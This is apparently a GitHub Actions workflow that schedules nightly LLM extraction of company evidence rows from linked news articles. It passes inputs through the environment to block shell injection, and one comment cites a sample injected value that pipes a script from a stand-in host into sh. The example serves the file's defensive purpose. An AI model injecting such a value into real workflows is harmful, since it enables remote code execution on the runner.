name: Extract company evidence

# Builds company_evidence rows from the news articles already linked to each
# company — contracts, deployments, customers, partnerships, funding.
#
# The links it reads are often wrong, so the refusals matter more than the
# extractions. The rules were exercised by hand against 40 real articles from the
# four most-covered companies before this was scheduled (docs/DATA-MODEL.md §10):
# 4 rows from 40, and all four of Lockheed Martin's known-bad links rejected.
#
# 50 companies a day clears the ~2,000 unscanned ones in about six weeks. Every
# row written is listed in the run summary, and a bad batch reverts in one
# statement because evidence_scanned_at marks exactly what was touched — see
# docs/DATA-MODEL.md §10.

on:
  schedule:
    - cron: "0 3 * * *"          # daily 03:00 UTC, clear of ingest, digest and the build
  workflow_dispatch:
    inputs:
      max:
        description: "Companies this run"
        default: "50"
        required: true
      concurrency:
        description: "Parallel LLM calls"
        default: "3"
        required: true
      company:
        description: "Only companies matching this name (optional, for spot-checks)"
        required: false
      dry_run:
        description: "Print what would be written, write nothing"
        type: boolean
        default: true

permissions:
  contents: read

concurrency:
  group: extract-evidence
  cancel-in-progress: false

jobs:
  extract:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v5
        with:
          node-version: "22"

      # The validation is what stands between the model and the database, so it
      # runs before every extraction rather than only on push.
      - name: Check the validation rules
        run: node scripts/test-evidence.mjs

      - name: Extract evidence
        # Inputs go through the environment, never into the command line: a value
        # like `x'; curl evil.sh | sh; '` would otherwise be run by the shell.
        run: |
          set -o pipefail
          # `if` rather than `[ x ] && y`: GitHub runs these with `bash -e`, where a
          # false test is a non-zero status and would end the step right here.
          ARGS=(--max "$IN_MAX" --concurrency "$IN_CONCURRENCY")
          # A scheduled run carries no inputs, so IN_DRY_RUN arrives empty. Test for
          # "true" rather than "not false", or the nightly job would quietly do
          # nothing every night while reporting success.
          if [ "$IN_DRY_RUN" = "true" ]; then ARGS+=(--dry-run); fi
          if [ -n "$IN_COMPANY" ]; then ARGS+=(--company "$IN_COMPANY"); fi
          {
            echo '## Evidence extraction'
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"
          node scripts/extract-evidence.mjs "${ARGS[@]}" | tee -a "$GITHUB_STEP_SUMMARY"
          echo '```' >> "$GITHUB_STEP_SUMMARY"
        env:
          IN_MAX: ${{ github.event.inputs.max || '50' }}
          IN_CONCURRENCY: ${{ github.event.inputs.concurrency || '3' }}
          IN_DRY_RUN: ${{ github.event.inputs.dry_run }}
          IN_COMPANY: ${{ github.event.inputs.company }}
          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
          SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_KEY }}
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
